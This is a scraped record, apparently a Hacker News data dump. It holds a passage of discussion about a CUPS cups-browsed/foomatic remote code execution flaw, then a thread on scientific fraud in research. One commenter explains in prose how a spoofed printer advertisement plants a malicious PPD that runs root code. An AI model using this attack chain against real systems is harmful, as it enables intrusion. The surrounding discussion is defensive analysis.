servers. reply bshipp 22 hours agoparentprevI don't know if I would say it's a nothing burger, but i don't see how it affects important servers. It might impact a number of linux desktops and, if they are linked to important servers, provide a backdoor access into important services. Being able to run arbitrary code in a root account with no authentication would seem to be a pretty important security breach, although I don't think it's quite the level of danger it was built up to be. reply andersa 22 hours agorootparentBut why would such desktops be exposed to the public internet directly? reply bshipp 22 hours agorootparentLikely no good reason. But he seemed to have identified many many systems that were, inexplicably, exposing port 631 to the internet. There is some reason people are doing it and, given the number of target systems, it must be some sort of default configuration. > \"This thing is packaged for anything, in some cases it’s enabled by default, in others it’s not, go figure . Full disclosure, I’ve been scanning the entire public internet IPv4 ranges several times a day for weeks, sending the UDP packet and logging whatever connected back. And I’ve got back connections from hundreds of thousands of devices, with peaks of 200-300K concurrent devices. This file contains a list of the unique Linux systems affected. Note that everything that is not Linux has been filtered out. That is why I was getting increasingly alarmed during the last few weeks.\" reply bonzini 22 hours agorootparentprevThe 9.9 issue is the foomatic-rip vulnerability; not cups-browsed listening on 0.0.0.0. See here: > LAN: a local attacker can spoof zeroconf / mDNS / DNS-SD advertisements (we will talk more about this in the next writeup) and achieve the same code path leading to RCE. reply yrro 2 hours agorootparentI believe you'd still need cups-browsed installed, enabled & configured to accept remote printer broadcasts, _and_ have foomatic installed locally in order to get hit by this. Modern version of cups will basically only talk to \"driverless\" IPP Everywhere printers, which all understand a common set of raster formats and hence have no need for printer-model specific software like foomatic-rip to be installed. They do this via mDNS, which means you don't need cups-browsed to be installed either. reply andersa 22 hours agorootparentprevI see. This sounds like a problem for people using public wifi... reply bonzini 22 hours agorootparentMaybe, maybe not. If I understand correctly, you still need to print something to the printer to achieve RCE via foomatic-rip. reply tsimionescu 12 hours agorootparentYou do, until someone finds a way to exploit the other buffer overflows. But also, this attack is persistent: you get infected without any interaction at the coffee shop, and two years later when you print something at home on your well secured network: BAM! reply aragilar 9 hours agorootparentUh, how? Unless somehow it stays around even though you've left the network (which I didn't think happens, but I could be wrong), this lasts just as long as the mDNS attacking server is on the network? This to me feels like the author missed why the system was set up the way it was, and therefore doesn't present useful solutions. reply tsimionescu 8 hours agorootparentPer the article, the attack works like this: The attacker sends a malicious UDP datagram to the target computer, telling it is a printer available at ATTACKER_CONTROLLED_URI. The vulnerable computer receives this packet and proceeds to download the \"printer information\" (attacker-controlled printer scripts) from ATTACKER_CONTROLLED_URI and store it in a PPD file as an available printer, potentially overwriting an existing printer. There is no user intervention needed, nor any notifications to the user, up to this point. The PPD files are persistent: they will stick around ~forever on your system until some other printer replaces them, or you manually delete them. Whenever you want to print, CUPS looks for all the PPD files currently on the system and provides print options based on them. If you choose to print using the malicious printer (which might look like one of your known printers), the information in the attacker-controlled PPD file will be used by CUPS, including Foomatic scripts that can run more or less arbitrary code with root privileges. The biggest issue with all of this is that Linux doesn't distinguish between trusted LANs, where arbitrary printers connecting to you is actually a pretty nice feature; and public untrusted LANs, where this is DEFINITELY not a good idea. Also, the fact that your printer infra can run arbitrary code as root, code supplied by the remote printer itself, is another level of crazy. reply yrro 2 hours agorootparent> Linux doesn't distinguish between trusted LANs [...] and public untrusted LANs Gotta be the annoying and point out here that Linux is a kernel. Fedora Workstation, for instance, has firewalld installed & enabled by default, which does apply different policies to different network zones. Hook a default system up to a hostile coffee shop, and TCP/UDP portsAlso, the fact that your printer infra can run arbitrary code as root, code supplied by the remote printer itself, is another level of crazy Only, it seems, if non-default legacy printer drivers (foomatic) and discovery services (cups-browsed) are present. And doesn't cups run backends as an unprivileged 'lp' user? And confined by MAC (again, in the Red Hat world, SELinux confines it to the cupsd_t domain). So not _that_ crazy. reply dumpsterdiver 18 hours agorootparentprevThe likely target that emerged in my mind reading this is mom and pop point of sale systems. The operators of such systems are completely oblivious to such risks, and the underpaid PoS software support team following a script to restart CUPS probably are as well. reply udev4096 22 hours agoprev [–] Github has given it a 4.4 score: https://github.com/OpenPrinting/cups/security/advisories/GHS... reply oskarkk 20 hours agoparent [–] That's unrelated to these findings. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The writeup discusses a Remote Code Execution (RCE) vulnerability in the CUPS project, specifically targeting the `cups-browsed` component on GNU/Linux systems.",
      "The author discovered a stack-buffer-overflow using fuzzing and developed an exploit that manipulates the `found_cups_printer` function to execute commands on a fully patched Ubuntu system.",
      "The post highlights the challenges faced during the responsible disclosure process, including dismissive responses from developers, and emphasizes the need for improved communication and prioritization in the infosec community."
    ],
    "commentSummary": [
      "A vulnerability in CUPS (Common UNIX Printing System) allows remote unauthenticated attackers to replace printer URLs with malicious ones, leading to arbitrary command execution when a print job is initiated.",
      "The severity of this vulnerability is debated, with some arguing it is overblown due to limited exposure (300,000 open CUPS instances) and mitigations like loopback-only configurations on many systems.",
      "The issue highlights broader concerns about the security of the `cups-browsed` daemon and the need for a serious discussion on the future of CUPS in the Linux ecosystem."
    ],
    "points": 403,
    "commentCount": 301,
    "retryCount": 0,
    "time": 1727380770
  },
  {
    "id": 41672599,
    "title": "Fraud, so much fraud",
    "originLink": "https://www.science.org/content/blog-post/fraud-so-much-fraud",
    "originBody": "www.science.org Verifying you are human. This may take a few seconds. www.science.org 8c9dbf09dba23b1a",
    "commentLink": "https://news.ycombinator.com/item?id=41672599",
    "commentBody": "Fraud, so much fraud (science.org)315 points by nabla9 2 hours agohidepastfavorite164 comments dang 1 hour agoHere's the article: https://www.science.org/content/article/research-misconduct-... dekhn 1 hour agoprevThese sorts of articles raise so many thoughts and emotions in me. I was trained as a computational biologist with a little lab work and ran gels from time to time. Personally, I hated gels- they're finicky, messy, ugly, and don't really tell you very much. But molecular biology as a field runs on gels- it's the priimary source of results for almost everything in molbio. I have seen more talks and papers that rested entirely a single image of a gel which is really just some dark bands. At the same time, I was a failed scientist: my gels weren't as interesting, or convincing compared to the ones done by the folks who went on to be more successful. At the time (20+ years ago) it didn't occur to me that anybody would intentionally modify images of gels to promote the results they claimed, although I did assume that folks didn't do a good job of organizing their data, and occasionally published papers that were wrong simply because they confused two images. Would I have been more successful if fewer people (and I now believe this is a common occurrence) published fraudulent images of gels? Maybe, maybe not. But the more important thing is that everybody just went along with this. I participated in many journal clubs where folks would just flip to Figure 3, assume the gel was what the authors claimed, and proceed to agree with (or disagree with) the results and conclusions uncritically. Whereas I would spend a lot of time trying to understand what experiment was actually run, and what th e data showed. reply testfoobar 38 minutes agoparentSimilar - when I was younger, I would never have suspected that a scientist was committing fraud. As I've gotten older, I understand that Charlie Munger's observation \"“Show me the incentive and I will show you the outcome.” is applicable everywhere - including science. Academic scientists' careers are driven by publishing, citations and impact. Arguably some have figured how to game the system to advance their careers. Science be damned. reply infamouscow 8 minutes agorootparentThe Manhattan project was a government project that was run like a startup. If such a project happened today, academic scientists would be trying to figure out ways to bend their existing research to match the grants. Then it would take another 30 years before people started to ask why nothing has been delivered yet. reply nextos 24 minutes agorootparentprevLots of people doing research find this depressing to the point of quitting. Many of my peers left research as they couldn't stomach all this nonsense. In experimental fields, the current academic system rewards dishonesty so much that ugly things have become really common. In my relatively short career, I have been asked to manipulate results several times. I refused, but this took an immense toll, especially on two occasions. Some people working with me wanted to support me fighting dishonesty. But guess what, they all had families and careers and were ultimately not willing to do anything as this could jeopardize their position. I've also witnessed first-hand how people that manage to publish well adopt monopolistic strategies, sabotaging interesting grant proposals from other groups or stalling their article submissions while they copy them. This is a problem that seldomly gets discussed. The current review system favors mono-cultures and winner-takes-it-all scenarios. For these reasons, I think industrial labs will be doing much better. Incentives there are not that perverse. reply schmidtleonard 36 minutes agoparentprevSimilar story: computational biologist, my presentations involved statistics so people would come to me for help, and it often ended in the disappointing news of a null result. I noticed that it always got published anyway at whichever stage of analysis showed \"promise.\" The day I saw someone P-hack their way to the front page of Nature was the day I decided to quit biology. I still feel that my bio work was far more important than anything I've done since, but over here the work is easier, the wages are much better, and fraud isn't table stakes. Frankly in exchange for those things I'm OK with the work being less important (EDIT: that's not a swipe at software engineering or my niche in it, it's a swipe at a system that is bad at incentives). Oh, and it turns out that software orgs have exactly the same problem, but they know that the solution is to pay for verification work. Science has to move through a few more stages of grief before it accepts this. reply nonrandomstring 48 minutes agoparentprev> Would I have been more successful What are you talking about? You _are_ successful. You're not a fraud like all those other tossers. reply dekhn 44 minutes agorootparentTo me, at the time, successful would have been getting a tenure-track position at a Tier 1 university, discovering something important, and never publishing anything that was intentional fraud (I'm OK with making some level of legitimate errors that could need to be retracted). Of those three, I certainly didn't achieve #1 or #2, but did achieve #3, mainly because I didn't write very much and obsessed over what was sent to the editor. Merely being a non-fraud is only part of success. (note: I've changed my definition of success, I now realize that I never ever really wanted to be a tenured professor at a Tier 1 university, because that role is far less fulfilling that I thought it would be). reply epistasis 36 minutes agorootparentMost often #1 is sought after as the prerequisite for achieving #2. And due to the structural factors on the number of positions available, funding available, and supply of new PhDs and postdocs, it's most often a really good idea to avoid #1 these days. reply otikik 27 minutes agorootparentprevIndeed! You would also been more \"successful\" selling drugs to teens, or trafficking with human organs. But you did not and that's a good thing. reply SpaceManNabs 38 minutes agorootparentprevThat is not enough to most people. And if it is enough for others, then it is probably because they were fortunate enough to fall back on something better. reply Lionga 55 minutes agoparentprevDon't hate the player hate the game. Governments made scientist only survive if they show results and specifically the results they want to see. Otherwise no anymore grants and you are done. Whether the results are fake or true does not matter \"Science\" nowadays is mostly BS, while the scientific method (hardly ever used in \"science\" nowadays) is still gold. reply MetaWhirledPeas 49 minutes agorootparentDo hate the player. People are taught ethics for a reason: no set of rules and laws are sufficient to ensure integrity of the system. We rely on personal integrity. This is why we teach it to our children. reply dhruvkar 45 minutes agorootparentWhen everything is a commodity (nothing runs outside of the market economy), the incentives are skewed to this type of behavior. 'Hate' the player' and 'hate' the game. Some things shouldn't be part of the market economy - education, health and food. reply artificialLimbs 42 minutes agorootparentprevHow did those teachings work out for the fraudsters? reply indymike 13 minutes agorootparentTheir parents taught them different ethics. reply SpaceManNabs 38 minutes agorootparentprevMost of them become distinguished in academia, and only a few get punished if they are too blatant or piss off too many people (see recent ivys losing their presidents over academic fraud). reply hacksoi 43 minutes agorootparentprevIf people can get away with it, they will do it. Rules and punishments for breaking them exist for a reason. reply testfoobar 24 minutes agorootparent> If people can get away with it, they will do it. This is not universally true and individuals and societies don't have to be organized this way. Why are streets in some countries filled with trash when others are clean? My community does not have anyone policing littering - yet our streets, parks and public areas are litter free. reply throwawayofcour 31 minutes agorootparentprev> If people can get away with it, they will do it. This isn't true of everyone, but assuming it is increases the likelihood that it will become so. Because if everyone is trying to get away with it, why shouldn't I? That sort of breakdown in trust is high up on my list of worrying societal failure modes. reply thfuran 25 minutes agorootparentprevIf they can get away with it, some people will do it. reply pmarreck 33 minutes agorootparentprevMy sole rational argument for Christianity is that it has made the societies that it is, or was, infused with, more honest than the ones that were not. reply projektfu 4 minutes agorootparentThat sounds like it is loaded with a lot of \"no true Scotsman\" caveats including, perhaps, Scotland, which has crime like any other country. ksenzee 22 minutes agorootparentprevI’m not sure there are any rational arguments for Christianity. I say that as a practicing Christian. Either it meets a spiritual need in you, or it’s not very valuable. I imagine that belief in a God who punishes evildoers has kept some people honest throughout history, but the value of that is surely outweighed by the evil done in the name of that God. I also don’t believe Christian societies are more honest than others. Every religion I know of teaches honesty, as does every non-religious ethical framework I can think of. reply Lionga 24 minutes agorootparentprevWe should really do some more honest crusades to export our honest values to the non believers to make the world a better, more honest place. reply greenavocado 26 minutes agorootparentprevA true scientist never says, \"trust me\" or even worse, \"trust the science.\" https://www.youtube.com/watch?v=gnPFL0Dr34c reply ljosifov 32 minutes agorootparentprevYou have agency. Yes - the system provides incentives. However, you are not some pass-through nothingness to just accept any incentives. You can chose to not accept the incentives. You can leave the system. You're lucky - it's not a totalitarian system. There will be another area of life and work where the incentives align with your personal morals. Once you bend your spine and kneel to bad incentives - you can never walk completely upright again. You may think and convince yourself that you can stay in the system with bad incentives, play the game, but still somehow you the player remain platonically unaffected. This is a delusion, and at some level you know it too. Who knows? If everyone left the system with bad incentives, it maybe that the bad system collapses even. It's a problem of collective action. The chances are against a collapse, that it will continue to go on for some time. So don't count on collapse. And even if one was to happen in your time, it will be scorched earth post collapse for some time. Think as an individual - it's best to leave if you possibly can. reply BobaFloutist 22 minutes agorootparentprev\"Nobody is ever responsible for their own actions. Economics predicting the existence of bad actors makes them not actually bad.\" reply Spivak 45 minutes agorootparentprevYou are clearly deeply disconnected from the actual practice of research. The best you can really say is that the statistics chops of most researchers is lacking and that someone researching say caterpillars is likely to not really understand the maths behind the tests they're performing. It's not an ideal solution by any means but universities are starting to hire stats and cs department grads to handle that part. reply neom 1 hour agoprevI'm the furthest thing from a scientist unless you count 3,000 hours of PBS spacetime, but I love science and so science/academia fraud to me, feels kinda like the worst kinda fraud you can commit. Financial fraud can cause suicides and ruin in lives, sure, but I feel like academic fraud just sets the whole of humanity back? I also feel that through my life I've (maybe wrongly) placed a great deal of respect and trust in scientists, mostly that they understand that their work is of the upmost importance and so the downstream consequences of mucking around are just too grave. Stuff like this seems to bother me more than it rationally should. Are people who commit this type of science fraud just really evil humans? Am I over thinking this? Do scientists go to jail for academic fraud? reply vasco 1 hour agoparentPick up an old engineering book at some point, something from mid 1800's or early 1900's and you'll quickly realize that the trust people put on science isn't what it should be. The scientific method works over a long period of time, but to blindly trust a peer review study that just came out, any study, is almost as much faith as religion, specially if you're not a high level researcher in the same field and have spent a good amount of time reading their methodology yourself. If you go to the social sciences then the amount of crock that gets published is incredible. As a quick example, any book about electricity from the early 1900's will include quite serious sections about the positive effects of electromagnetic radiation (or \"EM field therapies\"), teach you about different frequencies and modulations for different illnesses and how doctors are applying them. Today these devices are peddled by scammers of the same ilk as the ones that align your shakras with the right stone on your forehead. reply momoschili 1 hour agorootparentGoing to need some citations here since the texts that I'm familiar with from that time period are \"A Treatise on Electricity and Magnetism\" by Maxwell (mid-late 1800s) and \"A History of the Theories of Aether and Electricity\" by E. T. Whittaker, neither of which mentions anything of the sort. I suspect you are choosing from texts that at the time likely would not have been considered academic or standard. reply jvanderbot 23 minutes agorootparentYour points of memory are not counterpoints. Those are the ones that lived - and are not indicative of the general quality of science during those times. Obvious survivor bias. The fact that you can recall those reinforces the point that the value is determined by how long it is useful and remembered, not the fact that it was published. reply momoschili 12 minutes agorootparentIndeed, but you are clearly missing the historical context as these were two highly celebrated and referenced texts of the time period by leading scientists. However, it appears that the leading scientific minds (of which Maxwell and Whittaker are) did not include these uses in their texts. I do not dispute that science can be wrong (in fact it is almost always 'wrong' in the end) nor do I dispute that there could have been published research in those applications. I would argue that these applications were likely fringe at best within the scientific community by the mid 1800s. There are of course incredible scientists that went down disappointing paths (eg Shockley, Dyson, Pauling) in terms of their research output later on, though one must remember that typically this occurs outside their original field of expertise. If you read my comment you will see that I am asking for the references to the claims the previous author made. I simply provided my own references which werew written at the time and are representative of the times that do not corroborate the tall tale of the previous author. If you have any references to support their claim I would be interested in perusing them. reply Maxatar 6 minutes agorootparentprevBecause those two texts are the two among literally thousands of scientific publications that have survived the test of time, which is exactly the point being made. This might seem crazy to hear now, but when Maxwell first published A Dynamical Theory of the Electromagnetic Field in 1865, no one cared, it received very little attention at the time. It was decades later in 1888 with the work of Hertz that Maxwell's equations started to gain significance within the scientific community. reply momoschili 5 minutes agorootparentIt seems convenient that the evidence to corroborate the claim can't be found yes? I think you will also find that the publications of the 1800-1900s are quite well preserved. reply dekhn 1 hour agorootparentprevWe use EM radiation for illnesses and doctors apply them. It's one of the most important diagnostic and treatment options we have. I think what you're referring to is invalid therapies (\"woo\" or snake oil or just plain ignorance/greed) but it's hard to distinguish those from legitimate therapies at times. reply tredre3 55 minutes agorootparent> We use EM radiation for illnesses and doctors apply them. Do you have examples of usage as a treatment? I can only think of rTMS (whose effectiveness is contentious). reply nkrisc 38 minutes agorootparentJaundice in babies is treated with EM radiation in the 420–470 nm range. reply momoschili 52 minutes agorootparentprevThe most boring example is x-rays. Slightly less boring are the radiation therapies for cancer. What is maybe the most applicable that is widely accepted is electric therapy for people recovering from ACL surgeries. reply dekhn 52 minutes agorootparentprevGamma knife? Basically the entire field of radiotherapy? TMS is magnetic, not EM (the coil generates a magnetic field, which induces localized currents in the body being treated) reply fsckboy 26 minutes agorootparent>TMS is magnetic, not EM (the coil generates a magnetic field, which induces localized currents in the body ME? the coil generates an M which induces localized E in the body as shown by localized currents? (which produce some more M, but only just enough) reply dekhn 18 minutes agorootparentI can't parse what you are saying, but there's a difference between EM radiation and a magnetic field (and the resulting locally induced currents). Think in terms of an MRI machine: it puts you in a giant magnet (causing the various nuclear spins to align with the field) and then sends a bunch of EM radiation (radiofrequency). The former is a magnetic field, not EM radiation. reply jimbokun 1 hour agoparentprevI think the error is putting trust in scientists as people, instead of putting trust in science as a methodology. The methodology is designed to rely on trusting a process, not trusting individuals, to arrive at the truth. I guess it also reinforces the supreme importance of reproducibility. Seems like no research result should be taken seriously until at least one other scientist or group of scientists are able to reproduce the result. And if the work isn't sufficiently defined to the point of being reproducible, it should be considered a garbage study. reply doitLP 13 minutes agorootparentThe way I sum it up is: science is a method, which is not equivalent to the institution of science, and because that institution is run by humans it will contain and perpetrate all the ills of any human group. reply drpossum 1 hour agorootparentprevThere is no way to do any kind of science without putting trust in people. Science is not the universe as it is presented. Science is the human interpretation of observation. People are who carry out and interpret experiments. There is no set of methodology you can adopt that will ever change that. \"Reproducibility\" is important, but it is not a silver bullet. You cannot run any experiment exactly in the same way ever. If you have independent measurements you cannot rule out bias from prior results. Look at the error bars here on published values of the electron charge and tell me that methodology or reproducibility shored up the result. https://hsm.stackexchange.com/questions/264/timeline-of-meas... reply wordsinaline 44 minutes agorootparentprevThis error really went viral during the pandemic and continues to this day. We're in for an Orwellian future if the public does not cultivate some skeptic impulse. reply tensor 12 minutes agorootparentI'd say the public needs to develop some rational impulse, it already has plenty of skepitism to the point where people no longer trust science the methodology. Instead, they genuinely believe there is some alternative to finding the truth, and now simply believe the same old superstitions and bunk that people have prior to the scientific revolution. Speaking of Orwell, I don't think science comes into it. Rather, when people stop believing in democracy, things will degenerate into authoritarianism. It's generally pretty hard to use science the methodology to implement an authoritarian government as the scientific method by definition will follow the evidence, not the will of a dictator. However, something that looks like science but isn't could be used, especially if the public doesn't understand science and thus can't spot things that claim to be science but don't actually follow the scientific method. reply yunwal 16 minutes agorootparentprevHow does this work for things like COVID vaccines, where waiting for a reproduction study would leave hundreds of thousands dead? Ultimately there needs to be some level of trust in scientific institutions as well. I do think placing higher value on reproducibility studies might help the issue somewhat, but I think there also needs to be a larger culture shift of accountability and a higher purpose than profit. reply LeifCarrotson 1 hour agoparentprevYou're far from a scientist, so it's easy for you to put scientists/academia on a pedestal. For most of the people who end up in these scandals, this is just the day job that their various choices and random chance led up to. they're just ordinary humans responding to ordinary incentives in light of whatever consequences and risks they may or may not have considered. Other careers, like teaching, medicine, and engineering have similar problems. reply kzz102 37 minutes agoparentprevIn my view, prosecuting the bad actors alone will not fix science. Science is by its own nature a community because only a small number of people have the expertise (and university positions) to participate. A healthy scientific discipline and a healthy community are the same thing. Just like the \"tough on crime\" initiative alone often does not help a problematic community, just punish scientific fraud harshly will not fix the problem. Because the community is small, to catch the bad actors, you will either have insiders policing themselves, or have an non-expert outsiders rendering judgements. It's easy for well-intention-ed policing effort to turn into power struggles. This is why I think the most effective way is to empower good actors. Ensure open debate, limit the power of individuals, and prevent over concentration of power in a small group. These efforts are harder to implement than you think because they run against our desire to have scientific superstars and celebrities, but I think they will go a long way towards building a healthy community. reply tppiotrowski 1 hour agoparentprevThere was a period of time when science was advanced by the aristocrats who were self funded and self motivated. Once it became a distinguished profession the incentives changed. \"When a measure becomes a target, it ceases to be a good measure\" reply biorach 55 minutes agorootparent> There was a period of time when science was advanced by the aristocrats who were self funded and self motivated. From a distance the practice of science in early modern and Enlightenment times might look like the disinterested pursuit of knowledge for its own sake. If you read the detailed history of the times you'll see that the reality was much more messy. reply animal_spirits 19 minutes agorootparentDo you have any examples you know of or can share? I am curious this reply hilux 57 minutes agorootparentprevGoodhart's Law! reply Electricniko 1 hour agoparentprevIt seems like this could ultimately fall under the category of financial fraud, since the allegations are that he may have favorably misrepresented the results of drug trials where he was credited as an inventor of the drug that's now worth hundreds of millions of dollars. reply madmask 1 hour agoparentprevI agree with you, science fraud is terrible. It pollutes and breaks the scientific method. Enormous resources are wasted, not just by the fraudster but also by all the other well meaning scientists who base their work on that. In my experience no, most fraudsters are not evil people, they just follow the incentives and almost non-existent disincentives. Scientist has become just a job, you find all kinds of people there. As far as I know no-one goes to jail, worst thing possible (and very rare) is losing the job, most likely just the reputation. reply mden 1 hour agorootparent\"most fraudsters are not evil people, they just follow the incentives and almost non-existent disincentives\" Maybe I'm too idealistic but why does following incentives with no regard for secondary consequences not evil? reply layer8 57 minutes agorootparentIMO “evil” is a misconception. People have different beliefs and psychological needs, and placed in certain incentive structures that has the outcomes that we see. You can call certain behaviors “evil”, but that doesn’t explain anything about why the behaviors occur. reply ARandomerDude 36 minutes agorootparentIf someone raped your wife and set your children on fire, you would probably rethink your stance on evil. reply layer8 30 minutes agorootparentNope. “Evil” still provides no explanation and no understanding of why and how things happen there. It’s the same thing as believing in miracles created by a god. reply dyauspitr 4 minutes agorootparentprevPhysical pain is objective. Someone inflecting physical pain is evil unless it’s in self defense or common sense situations like a doctor performing surgery. reply transcranial 1 hour agoparentprevAs a collective endeavor to seek out higher truth, maybe some amount of fraud is necessary to train the immune system of the collective body, so to speak, so that it's more resilient in the long-term. But too much fraud, I agree, could tip into mistrust of the entire system. My fear is that AI further exacerbates this problem, and only AI itself can handle wading through the resulting volume of junk science output. reply dghlsakjg 1 hour agoparentprevIt is the same flavor of fraud as financial fraud. It is about personal gain, and avoiding loss. This kind of fraud happens because scientists are rewarded greatly for coming up with new, publishable, interesting results. They are punished severely for failing to do that. You could be the department's best professor in terms of teaching, but if you aren't publishing, your job is at risk at many universities. Scientists in Academia are incentivized to publish papers. If they can take shortcuts, and get away with it, they will. That's the whole problem, that's human nature. This is why you don't nearly as many industry scientists coming out with fraudulent papers. If Shell's scientists publish a paper, they aren't rewarded for that, if they come up with some efficient new way to refine oil they are rewarded, and they also might publish a paper if they feel like it. reply janice1999 1 hour agorootparent> If Shell's scientists publish a paper A lot of companies reward employees for publications. Mine certainly does. Also an oil company may not be such a great example since they directly and covertly rewarded scientists for publishing papers undermining climate change research. reply dghlsakjg 20 minutes agorootparentOk. Bad example using Shell, but the point is that Industry scientists do not have publication in journals as a primary incentive. A scientist can work in industry research and NEVER publish, and still have a career where they make money, and don't worry about losing their job. reply photochemsyn 1 hour agoparentprevIt's complicated. Historically scientific fraud could be construed as 'good-intentioned' - typically a researcher in a cutting edge field might think they understood how a system worked, and wanting to be first to publish for reasons of career advancement, would cook up data so they could get their paper into print before anyone else. Indeed, I believe many academic careers were kicked off in this manner. Where it all goes wrong is when other more diligent researchers fail to reproduce said fraudulent research - this is what brought down famous fraudster Jan Hendrik Schön in the field of plastic-based organic electronics, which involved something like 9 papers in Science and Nature. There are good books and documentaries on that one. This will only be getting worse with AI data generation, as most of those frauds were detected by banal data replication, obvious cuts and pastes, etc. However, when you add a big financial driver, things really go off the rails. A new pharmaceutical brings investors sniffing for a big payout, and cooking data to make the patentable 'discovery' look better than it is is a strong incentive to commit egregious fraud. Bug-eyed greed makes people do foolish things. reply eig 1 hour agoprevThis sort of behavior is only going to worsen in the coming decades as academics become more desperate. It's a prisoner's dilemma: if everyone is exaggerating their results you have to as well or you will be fired. It's even more dire for the thousands of visa students. The situation is similar to the \"Market for lemons\" in cars: if the market is polluted with lemons (fake papers), you are disincentivized to publish a plum (real results), since no one can tell it's not faked. You are instead incentivized to take a plum straight to industry and not disseminate it at all. Pharma companies are already known to closely guard their most promising data/results. Similar to the lemon market in cars, I think the only solution is government regulation. In fact, it would be a lot easier than passing lemon laws since most labs already get their funding from the government! Prior retractions should have significant negative impact on grant scores. This would not only incentivize labs, but would also incentivize institutions to hire clean scientists since they have higher grant earning potential. reply jimbokun 1 hour agoparentMy recommendation is for journals to place at least equal importance to publishing replications as for the original studies. Studies that have not been replicated should be published clearly marked as preliminary results. And then other scientists can pick those up and try to replicate them. And institutions need to give near equal weight to replications as to original research when deciding on promotions. Should be considered every researchers responsibility to contribute to the overall field. reply calebh 3 minutes agorootparentThis stuff happens in Computer Science too. Back around 2018 or so I was working on a problem that required graph matching (a relaxed/fuzzy version of the graph isomorphism problem) and was trying algorithms from many different papers. Many of the algorithms I tried to implement didn't work at all, despite considerable effort to get them to behave. In one particularly egregious (and highly cited) example, the algorithm in the paper differed from the provided code on GitHub. I emailed the authors trying to figure out what was going wrong, and they tried to get funding from me for support. My manager wanted me to right a literature review paper which skewered all of these bad papers, but I refused since I thought it would hurt my career. Ironically the algorithm that ended up working the best was from one of the more unknown papers, with few citations. reply mlsu 53 minutes agorootparentprevWe can solve this at the grant level. Stipulate that for every new paper a group publishes from a grant, that group must also publish a replication of an existing finding. Publication would happen in pairs, so that every novel thing would be matched with a replication. Replications could be matched with grants: if you receive $100,000 grant, you'd get the $100,000 you need, plus another $100,000 which you could use to publish a replication of a previous $100,000 grant. Researchers can choose which findings they replicate, but with restrictions, e.g. you can't just choose your group's previous thing. I think if we did this, researchers would naturally be incentivized to publish experiments that are easier to replicate and of course fraud like this would be caught eventually. I bet we could throw away half of publications tomorrow and see no effect on the actual pace of progress in science. reply scarmig 11 minutes agorootparent> I bet we could throw away half of publications tomorrow and see no effect on the actual pace of progress in science. It might actually improve the pace of science, if the half eliminated were not replicable and the remaining half were written by researchers knowing that they would likely face a replication attempt. reply eig 1 hour agorootparentprevThe problem with putting the onus on the journals is there is no incentive for them to reward replications. Journals don't make money on replicated results. Customers don't buy the replication paper they just read the abstract to see if it worked or not. I do like the idea of institutions giving tenure to people with results that have stood the test of time, but again, there is no incentive to do so. Institutions want superstar faculty, they care less about whether the results are true. The only real incentive that I think can be targeted is still grant money, but I would love to be proved wrong. reply scarmig 59 minutes agorootparentprevYou should be able to build an entire career out of replications: hired at the best universities, published in the top journals, social prestige and respect. To the point where every novel study is replicated and published at least once. Until we get to that point, there will be far fewer replications than needed for a healthy scientific system. reply bonoboTP 47 minutes agorootparent> social prestige and respect This one is the showstopper. No matter what you do with rules and regulations, if people aren't impressed by it at a watercooler conversation, or when chatting at a cocktail party at a conference, or when showing a politician around in your lab then nothing else matters. How prestigious something is is not a lever you control. reply BobaFloutist 17 minutes agorootparentThere absolutely exist skilled scientists that would happily make a living unglamorously replicating studies, if the money was there. Prestige is a nice motivator, but making a living at all is always the baseline, and is often sufficient. reply waveBidder 6 minutes agorootparentprevjournals have zero incentives to care about any of this. reply fluidcruft 4 minutes agoparentprevI wonder if there are any studies on whether fraud increased after the Bayh-Dole Act. There's certainly fraud for prestige, that's pretty expected. But mixing in financial benefits increases the reward and brings administrators into play. reply hilux 56 minutes agoparentprev> ... as academics become more desperate. Yes and ... we're already there. reply abigail95 36 minutes agoparentprevyou don't need regulation for a stable durable goods market. income and credit shocks cause turnover of good quality stock in the secondary market. reply Lionga 50 minutes agoparentprevBS governmental desperation to show any \"result\" (even if it is fake) is what brought us here. As scientist have to show more fake results to get more grants. Removing the government from science could help, not the other way around. reply clpm4j 3 minutes agoprevI'm not a researcher or academic, but when I think of roughly how long it takes me to do meaningful deep work and produce a project of any significance, I'm struck by the fact that his 800 papers isn't a red flag? Even if you allocate ~3 months per paper, that's over 200 years of work. Is it common for academics to produce research papers in a matter of days? From the article: Masliah appeared an ideal selection. The physician and neuropathologist conducted research at the University of California San Diego (UCSD) for decades, and his drive, curiosity, and productivity propelled him into the top ranks of scholars on Alzheimer’s and Parkinson’s disease. His roughly 800 research papers, many on how those conditions damage synapses, the junctions between neurons, have made him one of the most cited scientists in his field. reply hilux 24 minutes agoprevI shared this article with an MD/PhD friend who has done research at two of the three most famous science universities in America ... and she said \"this [not this guy, this phenomenon] is why I left science.\" Maybe it's like elite running - everyone who stays competitive above a certain level is cheating, and if you want to enjoy watching the sport, you just learn to look the other way. Except that the stakes for humanity are much higher in science than in sport. reply ubj 1 hour agoprevThe Retraction Watch website does a good job of reporting on various cases of retractions and scientific misconduct [1]. Like many others, I hope that a greater focus on reproducibility in academic journals and conferences will help reduce the spread of scientific misconduct and inaccuracy. [1]: https://retractionwatch.com/ reply hprotagonist 1 hour agoprev> It seems like a strange thing to take someone with a long and respected career and subject them to what would essentially be a Western blot and photomicrograph audit before offering them a big position. This is absolutely something that we should routinely be doing, though. reply majormajor 1 hour agoparentIt's pretty similar to the level of distrust in the software engineering job interview process. Pick your poison, to some extent. Better would be to not have to do it after-the-fact, but to vet better at every intermediate step, but it's hard. Just a very difficult people problem. reply idunnoman1222 1 hour agoprevThe amazing part about this to me is that the only reason the authors were caught is image manipulation. The fraud in numbers and text? Not so easy to uncover. Prediction: papers stop using pictures entirely reply slashdave 1 hour agoparentGenAI will make faking western blots fantastically easy reply Lerc 21 minutes agorootparentEventually AI will also be able to reliably audit papers and report on fraud. There may be newer AI methods of fraud, but it will only buy you time. As both progress, committing to record a fraud generated by technology will almost certainly be detected by a later technology. I would guess that we're within 10 years of being able to automatically audit the majority of papers currently published. That thought must give the authors of fraudulent papers the heebee jeebies. reply mbreese 1 hour agorootparentprevMany journals now require all versions of a gel image that is used in a figure. So, you’d have to fake the full image that is cropped down to the lanes used in the figure. I think there aren’t as many of those raw images around to train AI on… yet. reply ChainOfFools 45 minutes agorootparentI predict it will get even worse than that, in the next couple of decades I expect any document or work that has a substantial reward associated with it, either financially or in terms of career advancement or a grade for critical course work in one's major, or penalty such as indictment or conviction, to be backed by a time stamped stack of developing documentation, drafts, revisions, with these time stamp validated against a trusted custodial clock and a seed random string marking the start of work, recorded in some immutable public form. Accompanying to 